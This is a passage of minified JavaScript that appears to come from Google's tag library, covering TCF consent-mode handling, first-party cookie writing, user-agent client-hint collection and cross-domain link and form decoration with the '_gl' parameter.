                  m = Vl(n) ? !1 === n.gdprApplies || "tcunavailable" === n.tcString || void 0 === n.gdprApplies && !p || "string" !== typeof n.tcString || !n.tcString.length ? !0 : Tl(n, "1", 0) : !1;
                  g["1"] = m;
                } else g[k] = Tl(c, k, Wl[k]);
                d = g;
              }
              d && (a.tcString = c.tcString || "tcempty", a.bc = d, dm(a));
            }
          });
        } catch (c) {
          cm(a), S(62) ? (fk([Q.g.K, Q.g.Ea, Q.g.O]), Cj().active = !0) : dm(a);
        }
      }
    };
  function cm(a) {
    a.type = "e";
    a.tcString = "tcunavailable";
  }
  function em(a) {
    return "tcloaded" === a.eventStatus || "useractioncomplete" === a.eventStatus || "cmpuishown" === a.eventStatus;
  }
  function bm() {
    var a = {},
      b = (a[Q.g.K] = "denied", a[Q.g.wd] = Xl, a);
    Wj(b);
  }
  var am = function () {
      return !0 === z.gtag_enable_tcf_support;
    },
    $l = function () {
      var a = am();
      return S(62) ? !a && !0 !== Yl().enableAdvertiserConsentMode : !a;
    };
  function dm(a) {
    var b = {},
      c = (b[Q.g.K] = a.bc["1"] ? "granted" : "denied", b);
    if (S(62)) {
      if (!0 !== a.gdprApplies) {
        fk([Q.g.K, Q.g.Ea, Q.g.O]);
        Cj().active = !0;
        return;
      }
      c[Q.g.Ea] = a.bc["3"] && a.bc["4"] ? "granted" : "denied";
      "number" === typeof a.tcfPolicyVersion && 4 <= a.tcfPolicyVersion ? c[Q.g.O] = a.bc["1"] && a.bc["7"] ? "granted" : "denied" : fk([Q.g.O]);
    }
    Xj(c, {
      eventId: 0
    }, {
      gdprApplies: a ? a.gdprApplies : void 0,
      tcString: gm() || ""
    });
  }
  var gm = function () {
      var a = Yl();
      if (a.active) return a.tcString;
    },
    hm = function () {
      var a = Yl();
      if (a.active && void 0 !== a.gdprApplies) return a.gdprApplies ? "1" : "0";
    },
    im = function (a) {
      if (!Wl.hasOwnProperty(String(a))) return !0;
      var b = Yl();
      return b.active && b.bc ? !!b.bc[String(a)] : !0;
    };
  var jm = [Q.g.K, Q.g.U],
    km = [Q.g.K, Q.g.U, Q.g.O, Q.g.Ea],
    lm = {},
    mm = (lm[Q.g.K] = 1, lm[Q.g.U] = 2, lm);
  function nm(a) {
    if (void 0 === a) return 0;
    switch (V(a, Q.g.ka)) {
      case void 0:
        return 1;
      case !1:
        return 3;
      default:
        return 2;
    }
  }
  var om = function (a) {
      var b = nm(a);
      if (3 === b) return !1;
      if (S(54)) switch (Jj(Q.g.Ea)) {
        case 1:
        case 3:
          break;
        case 2:
          return !1;
        case 4:
          return 2 === b;
        case 0:
          break;
        default:
          return !1;
      }
      return !0;
    },
    pm = function () {
      return Mj() || !Ij(Q.g.K) || !Ij(Q.g.U);
    },
    qm = function () {
      var a = {},
        b;
      for (b in mm) mm.hasOwnProperty(b) && (a[mm[b]] = Jj(b));
      var c = S(40) && jm.every(Ij),
        d = S(36);
      return c || d ? Ne(a, 1) : Ne(a, 0);
    },
    rm = {},
    sm = (rm[Q.g.K] = 0, rm[Q.g.U] = 1, rm[Q.g.O] = 2, rm[Q.g.Ea] = 3, rm);
  function tm(a) {
    switch (a) {
      case void 0:
        return 1;
      case !0:
        return 3;
      case !1:
        return 2;
      default:
        return 0;
    }
  }
  var um = function (a) {
      if (S(37)) {
        for (var b = "1", c = 0; c < km.length; c++) {
          var d = b,
            e,
            f = km[c],
            g = yj[f];
          e = void 0 === g ? 0 : sm.hasOwnProperty(g) ? 12 | sm[g] : 8;
          var k = Cj();
          k.accessedAny = !0;
          var m = k.entries[f] || {};
          e = e << 2 | tm(m.implicit);
          b = d + ("" + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e] + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[tm(m.declare) << 4 | tm(m.default) << 2 | tm(m.update)]);
        }
        var n = b,
          p;
        p = "" + (Mj() << 2 | nm(a));
        return n + p;
      }
      for (var q = "G1", r = 0; r < jm.length; r++) switch (Kj(jm[r])) {
        case 3:
          q += "1";
          break;
        case 2:
          q += "0";
          break;
        case 1:
          q += "-";
      }
      return q;
    },
    vm = function () {
      if (!Ij(Q.g.O)) return "-";
      var a = Cj(),
        b = Aj,
        c = a.cps,
        d = a.usedSetCps,
        e = {};
      if (b && d) for (var f in zj) zj.hasOwnProperty(f) && zj[f].enabled && c.hasOwnProperty(f) && c[f].enabled ? e[f] = {
        enabled: !0,
        region: zj[f].region
      } : e[f] = {
        enabled: !1,
        region: zj[f].region
      };else {
        var g = b ? zj : c,
          k;
        for (k in g) g.hasOwnProperty(k) && (e[k] = {
          enabled: g[k].enabled,
          region: g[k].region
        });
      }
      for (var m = {}, n = ha(Object.keys(e)), p = n.next(); !p.done; p = n.next()) {
        var q = p.value;
        m[q] = e[q].enabled;
      }
      for (var r = "", t = ha(Object.keys(mi)), u = t.next(); !u.done; u = t.next()) {
        var v = u.value;
        !1 !== m[v] && (r += mi[v]);
      }
      return "" === r ? "-" : r;
    };
  function wm() {
    var a = !!lj["6"],
      b = !1;
    S(62) && (b = !$l() && "1" === hm());
    return a || b;
  }
  var xm = function () {
      return wm() ? "1" : "0";
    },
    ym = function () {
      return wm() || Cj().usedSetCps || !Ij(Q.g.O);
    },
    zm = function () {
      var a = "0",
        b = "0",
        c;
      var d = Yl();
      c = d.active && S(62) ? d.cmpId : void 0;
      "number" === typeof c && 0 <= c && 4095 >= c && (a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[c >> 6 & 63], b = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[c & 63]);
      var e = "0",
        f;
      var g = Yl();
      f = g.active && S(62) ? g.tcfPolicyVersion : void 0;
      "number" === typeof f && 0 <= f && 63 >= f && (e = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[f]);
      var k = 0;
      lj["6"] && (k |= 1);
      "1" === hm() && (k |= 2);
      am() && (k |= 4);
      var m;
      var n = Yl();
      m = void 0 !== n.enableAdvertiserConsentMode ? n.enableAdvertiserConsentMode ? "1" : "0" : void 0;
      "1" === m && (k |= 8);
      Cj().waitPeriodTimedOut && (k |= 16);
      return "1" + a + b + e + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[k];
    };
  var Am = function (a, b, c) {
    for (var d = [], e = b.split(";"), f = 0; f < e.length; f++) {
      var g = e[f].split("="),
        k = g[0].replace(/^\s*|\s*$/g, "");
      if (k && k == a) {
        var m = g.slice(1).join("=").replace(/^\s*|\s*$/g, "");
        m && c && (m = decodeURIComponent(m));
        d.push(m);
      }
    }
    return d;
  };
  function Bm(a) {
    return "null" !== a.origin;
  }
  ;
  var Em = function (a, b, c, d) {
      return Cm(d) ? Am(a, String(b || Dm()), c) : [];
    },
    Hm = function (a, b, c, d, e) {
      if (Cm(e)) {
        var f = Fm(a, d, e);
        if (1 === f.length) return f[0].id;
        if (0 !== f.length) {
          f = Gm(f, function (g) {
            return g.Gf;
          }, b);
          if (1 === f.length) return f[0].id;
          f = Gm(f, function (g) {
            return g.Qe;
          }, c);
          return f[0] ? f[0].id : void 0;
        }
      }
    };
  function Im(a, b, c, d) {
    var e = Dm(),
      f = window;
    Bm(f) && (f.document.cookie = a);
    var g = Dm();
    return e != g || void 0 != c && 0 <= Em(b, g, !1, d).indexOf(c);
  }
  var Mm = function (a, b, c, d) {
      function e(w, x, y) {
        if (null == y) return delete k[x], w;
        k[x] = y;
        return w + "; " + x + "=" + y;
      }
      function f(w, x) {
        if (null == x) return delete k[x], w;
        k[x] = !0;
        return w + "; " + x;
      }
      if (!Cm(c.Fb)) return 2;
      var g;
      void 0 == b ? g = a + "=deleted; expires=" + new Date(0).toUTCString() : (c.encode && (b = encodeURIComponent(b)), b = Jm(b), g = a + "=" + b);
      var k = {};
      g = e(g, "path", c.path);
      var m;
      c.expires instanceof Date ? m = c.expires.toUTCString() : null != c.expires && (m = "" + c.expires);
      g = e(g, "expires", m);
      g = e(g, "max-age", c.xm);
      g = e(g, "samesite", c.Rm);
      c.Tm && (g = f(g, "secure"));
      var n = c.domain;
      if (n && "auto" === n.toLowerCase()) {
        for (var p = Km(), q = void 0, r = !1, t = 0; t < p.length; ++t) {
          var u = "none" !== p[t] ? p[t] : void 0,
            v = e(g, "domain", u);
          v = f(v, c.flags);
          try {
            d && d(a, k);
          } catch (w) {
            q = w;
            continue;
          }
          r = !0;
          if (!Lm(u, c.path) && Im(v, a, b, c.Fb)) return 0;
        }
        if (q && !r) throw q;
        return 1;
      }
      n && "none" !== n.toLowerCase() && (g = e(g, "domain", n));
      g = f(g, c.flags);
      d && d(a, k);
      return Lm(n, c.path) ? 1 : Im(g, a, b, c.Fb) ? 0 : 1;
    },
    Nm = function (a, b, c) {
      null == c.path && (c.path = "/");
      c.domain || (c.domain = "auto");
      return Mm(a, b, c);
    };
  function Gm(a, b, c) {
    for (var d = [], e = [], f, g = 0; g < a.length; g++) {
      var k = a[g],
        m = b(k);
      m === c ? d.push(k) : void 0 === f || m < f ? (e = [k], f = m) : m === f && e.push(k);
    }
    return 0 < d.length ? d : e;
  }
  function Fm(a, b, c) {
    for (var d = [], e = Em(a, void 0, void 0, c), f = 0; f < e.length; f++) {
      var g = e[f].split("."),
        k = g.shift();
      if (!b || -1 !== b.indexOf(k)) {
        var m = g.shift();
        m && (m = m.split("-"), d.push({
          id: g.join("."),
          Gf: 1 * m[0] || 1,
          Qe: 1 * m[1] || 1
        }));
      }
    }
    return d;
  }
  var Jm = function (a) {
      a && 1200 < a.length && (a = a.substring(0, 1200));
      return a;
    },
    Om = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
    Pm = /(^|\.)doubleclick\.net$/i,
    Lm = function (a, b) {
      return Pm.test(window.document.location.hostname) || "/" === b && Om.test(a);
    },
    Dm = function () {
      return Bm(window) ? window.document.cookie : "";
    },
    Km = function () {
      var a = [],
        b = window.document.location.hostname.split(".");
      if (4 === b.length) {
        var c = b[b.length - 1];
        if (parseInt(c, 10).toString() === c) return ["none"];
      }
      for (var d = b.length - 2; 0 <= d; d--) a.push(b.slice(d).join("."));
      var e = window.document.location.hostname;
      Pm.test(e) || Om.test(e) || a.push("none");
      return a;
    },
    Cm = function (a) {
      return a && vj().h() ? (h(a) ? [a] : a).every(function (b) {
        return Lj(b) && Ij(b);
      }) : !0;
    };
  var Qm = function (a) {
      var b = Math.round(2147483647 * Math.random());
      return a ? String(b ^ $i(a) & 2147483647) : String(b);
    },
    Rm = function (a) {
      return [Qm(a), Math.round(Ua() / 1E3)].join(".");
    },
    Um = function (a, b, c, d, e) {
      var f = Sm(b);
      return Hm(a, f, Tm(c), d, e);
    },
    Vm = function (a, b, c, d) {
      var e = "" + Sm(c),
        f = Tm(d);
      1 < f && (e += "-" + f);
      return [b, e, a].join(".");
    },
    Sm = function (a) {
      if (!a) return 1;
      a = 0 === a.indexOf(".") ? a.substr(1) : a;
      return a.split(".").length;
    },
    Tm = function (a) {
      if (!a || "/" === a) return 1;
      "/" !== a[0] && (a = "/" + a);
      "/" !== a[a.length - 1] && (a += "/");
      return a.split("/").length - 1;
    };
  var Wm = function () {
    oi.dedupe_gclid || (oi.dedupe_gclid = "" + Rm());
    return oi.dedupe_gclid;
  };
  var Xm = function () {
    var a = !1;
    return a;
  };
  var Ym = {
      UA: 1,
      AW: 2,
      DC: 3,
      G: 4,
      GF: 5,
      GT: 12,
      GTM: 14,
      HA: 6,
      MC: 7
    },
    hn = function (a, b) {
      var c = Tf.ctid.split("-")[0].toUpperCase(),
        d = {};
      d.ctid = Tf.ctid;
      d.Om = ni.oe;
      d.Qm = ni.Xg;
      d.qm = lk.ke ? 2 : 1;
      d.ue = Tf.Ef;
      d.ue !== a && (d.Xf = a);
      S(91) ? d.Qj = 1 : S(90) && (d.Qj = 2);
      ui ? (d.Vf = Ym[c], d.Vf || (d.Vf = 0)) : d.Vf = Ai ? 13 : 10;
      yi ? d.Ah = 1 : Xm() ? d.Ah = 2 : d.Ah = 3;
      var e;
      var f = d.Vf,
        g = d.Ah;
      void 0 === f ? e = "" : (g || (g = 0), e = "" + Hg(1, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[f << 2 | g]);
      var k = d.Mn,
        m = 4 + e + (k ? "" + Hg(2, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[k] : ""),
        n,
        p = d.Qm;
      n = p && Gg.test(p) ? "" + Hg(3, 2) + p : "";
      var q,
        r = d.Om;
      q = r ? "" + Hg(4, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[r] : "";
      var t;
      var u = d.ctid;
      if (u && b) {
        var v = u.split("-"),
          w = v[0].toUpperCase();
        if ("GTM" !== w && "OPT" !== w) t = "";else {
          var x = v[1];
          t = "" + Hg(5, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[1 + x.length] + (d.qm || 0) + x;
        }
      } else t = "";
      var y = d.Qj,
        A = d.ue,
        C = d.Xf,
        D = d.Rn;
      return m + n + q + t + (y ? "" + Hg(6, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[y] : "") + (A ? "" + Hg(7, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[A.length] + A : "") + (C ? "" + Hg(8, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[C.length] + C : "") + (D ? "" + Hg(9, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[D.length] + D : "");
    };
  var jn = void 0;
  function kn(a) {
    var b = "";
    return b;
  }
  ;
  var ln = function (a) {
    for (var b = [], c = 0, d = 0; d < a.length; d++) {
      var e = a.charCodeAt(d);
      128 > e ? b[c++] = e : (2048 > e ? b[c++] = e >> 6 | 192 : (55296 == (e & 64512) && d + 1 < a.length && 56320 == (a.charCodeAt(d + 1) & 64512) ? (e = 65536 + ((e & 1023) << 10) + (a.charCodeAt(++d) & 1023), b[c++] = e >> 18 | 240, b[c++] = e >> 12 & 63 | 128) : b[c++] = e >> 12 | 224, b[c++] = e >> 6 & 63 | 128), b[c++] = e & 63 | 128);
    }
    return b;
  };
  bc();
  xl() || Zb("iPod");
  Zb("iPad");
  !Zb("Android") || cc() || bc() || ac() || Zb("Silk");
  cc();
  !Zb("Safari") || cc() || ($b() ? 0 : Zb("Coast")) || ac() || ($b() ? 0 : Zb("Edge")) || ($b() ? Yb("Microsoft Edge") : Zb("Edg/")) || ($b() ? Yb("Opera") : Zb("OPR")) || bc() || Zb("Silk") || Zb("Android") || yl();
  var mn = {},
    nn = null,
    on = function (a) {
      for (var b = [], c = 0, d = 0; d < a.length; d++) {
        var e = a.charCodeAt(d);
        255 < e && (b[c++] = e & 255, e >>= 8);
        b[c++] = e;
      }
      var f = 4;
      void 0 === f && (f = 0);
      if (!nn) {
        nn = {};
        for (var g = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), k = ["+/=", "+/", "-_=", "-_.", "-_"], m = 0; 5 > m; m++) {
          var n = g.concat(k[m].split(""));
          mn[m] = n;
          for (var p = 0; p < n.length; p++) {
            var q = n[p];
            void 0 === nn[q] && (nn[q] = p);
          }
        }
      }
      for (var r = mn[f], t = Array(Math.floor(b.length / 3)), u = r[64] || "", v = 0, w = 0; v < b.length - 2; v += 3) {
        var x = b[v],
          y = b[v + 1],
          A = b[v + 2],
          C = r[x >> 2],
          D = r[(x & 3) << 4 | y >> 4],
          F = r[(y & 15) << 2 | A >> 6],
          H = r[A & 63];
        t[w++] = "" + C + D + F + H;
      }
      var G = 0,
        I = u;
      switch (b.length - v) {
        case 2:
          G = b[v + 1], I = r[(G & 15) << 2] || u;
        case 1:
          var P = b[v];
          t[w] = "" + r[P >> 2] + r[(P & 3) << 4 | G >> 4] + I + u;
      }
      return t.join("");
    };
  Object.freeze({});
  var pn = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
  function qn(a) {
    var b;
    return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
  }
  function rn() {
    var a = z.google_tag_data,
      b;
    if (null != a && a.uach) {
      var c = a.uach,
        d = Object.assign({}, c);
      c.fullVersionList && (d.fullVersionList = c.fullVersionList.slice(0));
      b = d;
    } else b = null;
    return b;
  }
  function sn() {
    var a, b;
    return null != (b = null == (a = z.google_tag_data) ? void 0 : a.uach_promise) ? b : null;
  }
  function tn(a) {
    var b, c;
    return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
  }
  function un() {
    var a = z;
    if (!tn(a)) return null;
    var b = qn(a);
    if (b.uach_promise) return b.uach_promise;
    var c = a.navigator.userAgentData.getHighEntropyValues(pn).then(function (d) {
      null != b.uach || (b.uach = d);
      return d;
    });
    return b.uach_promise = c;
  }
  ;
  var vn,
    wn = function () {
      if (tn(z) && (vn = Ua(), !sn())) {
        var a = un();
        a && (a.then(function () {
          O(95);
        }), a.catch(function () {
          O(96);
        }));
      }
    },
    yn = function (a) {
      var b = xn.hn,
        c = function (g, k) {
          try {
            a(g, k);
          } catch (m) {}
        },
        d = rn();
      if (d) c(d);else {
        var e = sn();
        if (e) {
          b = Math.min(Math.max(isFinite(b) ? b : 0, 0), 1E3);
          var f = z.setTimeout(function () {
            c.Le || (c.Le = !0, O(106), c(null, Error("Timeout")));
          }, b);
          e.then(function (g) {
            c.Le || (c.Le = !0, O(104), z.clearTimeout(f), c(g));
          }).catch(function (g) {
            c.Le || (c.Le = !0, O(105), z.clearTimeout(f), c(null, g));
          });
        } else c(null);
      }
    },
    zn = function (a, b) {
      a && (b.h[Q.g.Yd] = a.architecture, b.h[Q.g.Zd] = a.bitness, a.fullVersionList && (b.h[Q.g.ae] = a.fullVersionList.map(function (c) {
        return encodeURIComponent(c.brand || "") + ";" + encodeURIComponent(c.version || "");
      }).join("|")), b.h[Q.g.be] = a.mobile ? "1" : "0", b.h[Q.g.ce] = a.model, b.h[Q.g.de] = a.platform, b.h[Q.g.ee] = a.platformVersion, b.h[Q.g.fe] = a.wow64 ? "1" : "0");
    };
  var An = /:[0-9]+$/,
    Bn = /^\d+\.fls\.doubleclick\.net$/,
    Cn = function (a, b, c, d) {
      function e(r) {
        return Sf(10) ? decodeURIComponent(r.replace(/\+/g, " ")) : decodeURIComponent(r).replace(/\+/g, " ");
      }
      for (var f = [], g = ha(a.split("&")), k = g.next(); !k.done; k = g.next()) {
        var m = ha(k.value.split("=")),
          n = m.next().value,
          p = ja(m);
        if (e(n) === b) {
          var q = p.join("=");
          if (!c) return d ? q : e(q);
          f.push(d ? q : e(q));
        }
      }
      return c ? f : void 0;
    },
    Fn = function (a, b, c, d, e) {
      b && (b = String(b).toLowerCase());
      if ("protocol" === b || "port" === b) a.protocol = Dn(a.protocol) || Dn(z.location.protocol);
      "port" === b ? a.port = String(Number(a.hostname ? a.port : z.location.port) || ("http" === a.protocol ? 80 : "https" === a.protocol ? 443 : "")) : "host" === b && (a.hostname = (a.hostname || z.location.hostname).replace(An, "").toLowerCase());
      return En(a, b, c, d, e);
    },
    En = function (a, b, c, d, e) {
      var f,
        g = Dn(a.protocol);
      b && (b = String(b).toLowerCase());
      switch (b) {
        case "url_no_fragment":
          f = Gn(a);
          break;
        case "protocol":
          f = g;
          break;
        case "host":
          f = a.hostname.replace(An, "").toLowerCase();
          if (c) {
            var k = /^www\d*\./.exec(f);
            k && k[0] && (f = f.substr(k[0].length));
          }
          break;
        case "port":
          f = String(Number(a.port) || ("http" === g ? 80 : "https" === g ? 443 : ""));
          break;
        case "path":
          a.pathname || a.hostname || Ab("TAGGING", 1);
          f = "/" === a.pathname.substr(0, 1) ? a.pathname : "/" + a.pathname;
          var m = f.split("/");
          0 <= (d || []).indexOf(m[m.length - 1]) && (m[m.length - 1] = "");
          f = m.join("/");
          break;
        case "query":
          f = a.search.replace("?", "");
          e && (f = Cn(f, e, !1));
          break;
        case "extension":
          var n = a.pathname.split(".");
          f = 1 < n.length ? n[n.length - 1] : "";
          f = f.split("/")[0];
          break;
        case "fragment":
          f = a.hash.replace("#", "");
          break;
        default:
          f = a && a.href;
      }
      return f;
    },
    Dn = function (a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    },
    Gn = function (a) {
      var b = "";
      if (a && a.href) {
        var c = a.href.indexOf("#");
        b = 0 > c ? a.href : a.href.substr(0, c);
      }
      return b;
    },
    Hn = function (a) {
      var b = E.createElement("a");
      a && (b.href = a);
      var c = b.pathname;
      "/" !== c[0] && (a || Ab("TAGGING", 1), c = "/" + c);
      var d = b.hostname.replace(An, "");
      return {
        href: b.href,
        protocol: b.protocol,
        host: b.host,
        hostname: d,
        pathname: c,
        search: b.search,
        hash: b.hash,
        port: b.port
      };
    },
    In = function (a) {
      function b(n) {
        var p = n.split("=")[0];
        return 0 > d.indexOf(p) ? n : p + "=0";
      }
      function c(n) {
        return n.split("&").map(b).filter(function (p) {
          return void 0 !== p;
        }).join("&");
      }
      var d = "gclid dclid gbraid wbraid gclaw gcldc gclha gclgf gclgb _gl".split(" "),
        e = Hn(a),
        f = a.split(/[?#]/)[0],
        g = e.search,
        k = e.hash;
      "?" === g[0] && (g = g.substring(1));
      "#" === k[0] && (k = k.substring(1));
      g = c(g);
      k = c(k);
      "" !== g && (g = "?" + g);
      "" !== k && (k = "#" + k);
      var m = "" + f + g + k;
      "/" === m[m.length - 1] && (m = m.substring(0, m.length - 1));
      return m;
    },
    Jn = function (a) {
      var b = Hn(z.location.href),
        c = Fn(b, "host", !1);
      if (c && c.match(Bn)) {
        var d = Fn(b, "path").split(a + "=");
        if (1 < d.length) return d[1].split(";")[0].split("?")[0];
      }
    };
  function Kn(a, b, c, d) {
    var e,
      f = Number(null != a.Yb ? a.Yb : void 0);
    0 !== f && (e = new Date((b || Ua()) + 1E3 * (f || 7776E3)));
    return {
      path: a.path,
      domain: a.domain,
      flags: a.flags,
      encode: !!c,
      expires: e,
      Fb: d
    };
  }
  ;
  var Ln;
  var Pn = function () {
      var a = Mn,
        b = Nn,
        c = On(),
        d = function (g) {
          a(g.target || g.srcElement || {});
        },
        e = function (g) {
          b(g.target || g.srcElement || {});
        };
      if (!c.init) {
        Oc(E, "mousedown", d);
        Oc(E, "keyup", d);
        Oc(E, "submit", e);
        var f = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function () {
          b(this);
          f.call(this);
        };
        c.init = !0;
      }
    },
    Qn = function (a, b, c, d, e) {
      var f = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e
      };
      On().decorators.push(f);
    },
    Rn = function (a, b, c) {
      for (var d = On().decorators, e = {}, f = 0; f < d.length; ++f) {
        var g = d[f],
          k;
        if (k = !c || g.forms) a: {
          var m = g.domains,
            n = a,
            p = !!g.sameHost;
          if (m && (p || n !== E.location.hostname)) for (var q = 0; q < m.length; q++) if (m[q] instanceof RegExp) {
            if (m[q].test(n)) {
              k = !0;
              break a;
            }
          } else if (0 <= n.indexOf(m[q]) || p && 0 <= m[q].indexOf(n)) {
            k = !0;
            break a;
          }
          k = !1;
        }
        if (k) {
          var r = g.placement;
          void 0 == r && (r = g.fragment ? 2 : 1);
          r === b && Xa(e, g.callback());
        }
      }
      return e;
    };
  function On() {
    var a = Fc("google_tag_data", {}),
      b = a.gl;
    b && b.decorators || (b = {
      decorators: []
    }, a.gl = b);
    return b;
  }
  ;
  var Sn = /(.*?)\*(.*?)\*(.*)/,
    Tn = /^https?:\/\/([^\/]*?)\.?cdn\.ampproject\.org\/?(.*)/,
    Un = /^(?:www\.|m\.|amp\.)+/,
    Vn = /([^?#]+)(\?[^#]*)?(#.*)?/;
  function Wn(a, b) {
    var c = [Dc.userAgent, new Date().getTimezoneOffset(), Dc.userLanguage || Dc.language, Math.floor(Ua() / 60 / 1E3) - (void 0 === b ? 0 : b), a].join("*"),
      d;
    if (!(d = Ln)) {
      for (var e = Array(256), f = 0; 256 > f; f++) {
        for (var g = f, k = 0; 8 > k; k++) g = g & 1 ? g >>> 1 ^ 3988292384 : g >>> 1;
        e[f] = g;
      }
      d = e;
    }
    Ln = d;
    for (var m = 4294967295, n = 0; n < c.length; n++) m = m >>> 8 ^ Ln[(m ^ c.charCodeAt(n)) & 255];
    return ((m ^ -1) >>> 0).toString(36);
  }
  function Xn() {
    return function (a) {
      var b = Hn(z.location.href),
        c = b.search.replace("?", ""),
        d = Cn(c, "_gl", !1, !0) || "";
      a.query = Yn(d) || {};
      var e = Fn(b, "fragment"),
        f;
      var g = -1;
      if (Za(e, "_gl=")) g = 4;else {
        var k = e.indexOf("&_gl=");
        0 < k && (g = k + 3 + 2);
      }
      if (0 > g) f = void 0;else {
        var m = e.indexOf("&", g);
        f = 0 > m ? e.substring(g) : e.substring(g, m);
      }
      a.fragment = Yn(f || "") || {};
    };
  }
  var Zn = function (a) {
      var b = Xn(),
        c = On();
      c.data || (c.data = {
        query: {},
        fragment: {}
      }, b(c.data));
      var d = {},
        e = c.data;
      e && (Xa(d, e.query), a && Xa(d, e.fragment));
      return d;
    },
    Yn = function (a) {
      try {
        var b = $n(a, 3);
        if (void 0 !== b) {
          for (var c = {}, d = b ? b.split("*") : [], e = 0; e + 1 < d.length; e += 2) {
            var f = d[e],
              g = yb(d[e + 1]);
            c[f] = g;
          }
          Ab("TAGGING", 6);
          return c;
        }
      } catch (k) {
        Ab("TAGGING", 8);
      }
    };
  function $n(a, b) {
    if (a) {
      var c;
      a: {
        for (var d = a, e = 0; 3 > e; ++e) {
          var f = Sn.exec(d);
          if (f) {
            c = f;
            break a;
          }
          d = decodeURIComponent(d);
        }
        c = void 0;
      }
      var g = c;
      if (g && "1" === g[1]) {
        var k = g[3],
          m;
        a: {
          for (var n = g[2], p = 0; p < b; ++p) if (n === Wn(k, p)) {
            m = !0;
            break a;
          }
          m = !1;
        }
        if (m) return k;
        Ab("TAGGING", 7);
      }
    }
  }
  function ao(a, b, c, d, e) {
    function f(q) {
      var r = q,
        t = new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)").exec(r),
        u = r;
      if (t) {
        var v = t[2],
          w = t[4];
        u = t[1];
        w && (u = u + v + w);
      }
      q = u;
      var x = q.charAt(q.length - 1);
      q && "&" !== x && (q += "&");
      return q + p;
    }
    d = void 0 === d ? !1 : d;
    e = void 0 === e ? !1 : e;
    var g = Vn.exec(c);
    if (!g) return "";
    var k = g[1],
      m = g[2] || "",
      n = g[3] || "",
      p = a + "=" + b;
    d ? 0 !== n.substring(1).length && e || (n = "#" + f(n.substring(1))) : m = "?" + f(m.substring(1));
    return "" + k + m + n;
  }
  function bo(a, b) {
    function c(n, p, q) {
      if (Object.keys(n).length) {
        var r,
          t = [],
          u;
        for (u in n) if (n.hasOwnProperty(u)) {
          var v = n[u];
          void 0 !== v && v === v && null !== v && "[object Object]" !== v.toString() && (t.push(u), t.push(xb(String(v))));
        }
        var w = t.join("*");
        r = ["1", Wn(w), w].join("*");
        d ? (Sf(13) || Sf(11) || !p) && co("_gl", r, a, p, q) : eo("_gl", r, a, p, q);
      }
    }
    var d = "FORM" === (a.tagName || "").toUpperCase(),
      e = Rn(b, 1, d),
      f = Rn(b, 2, d),
      g = Rn(b, 4, d),
      k = Rn(b, 3, d);
    c(e, !1, !1);
    c(f, !0, !1);
    Sf(11) && c(g, !0, !0);
    for (var m in k) k.hasOwnProperty(m) && fo(m, k[m], a);
  }
  function fo(a, b, c) {
    if (c.tagName) {
      if ("a" === c.tagName.toLowerCase()) {
        eo(a, b, c);
        return;
      }
      if ("form" === c.tagName.toLowerCase()) {
        co(a, b, c);
        return;
      }
    }
    "string" == typeof c && ao(a, b, c);
  }
  function eo(a, b, c, d, e) {
    if (c.href) {
      var f = ao(a, b, c.href, void 0 === d ? !1 : d, void 0 === e ? !1 : e);
      tc.test(f) && (c.href = f);
    }
  }
  function co(a, b, c, d, e) {
    d = void 0 === d ? !1 : d;
    e = void 0 === e ? !1 : e;
    if (c && c.action) {
      var f = (c.method || "").toLowerCase();
      if ("get" !== f || d) {
        if ("get" === f || "post" === f) {
          var g = ao(a, b, c.action, d, e);
          tc.test(g) && (c.action = g);
        }
      } else {
        for (var k = c.childNodes || [], m = !1, n = 0; n < k.length; n++) {
          var p = k[n];
          if (p.name === a) {
            p.setAttribute("value", b);
            m = !0;
            break;
          }
        }
        if (!m) {
          var q = E.createElement("input");
          q.setAttribute("type", "hidden");
          q.setAttribute("name", a);
          q.setAttribute("value", b);
          c.appendChild(q);
        }
      }
    }
  }
  function Mn(a) {
    try {
      var b;
      a: {
        for (var c = a, d = 100; c && 0 < d;) {
          if (c.href && c.nodeName.match(/^a(?:rea)?$/i)) {
            b = c;
            break a;
          }
          c = c.parentNode;
          d--;
        }
        b = null;
      }
      var e = b;
      if (e) {
        var f = e.protocol;
        "http:" !== f && "https:" !== f || bo(e, e.hostname);
      }
    } catch (g) {}
  }
  function Nn(a) {
    try {
      if (a.action) {
        var b = Fn(Hn(a.action), "host");
        bo(a, b);
      }
    } catch (c) {}
  }
  var go = function (a, b, c, d) {
      Pn();
      Qn(a, b, "fragment" === c ? 2 : 1, !!d, !1);
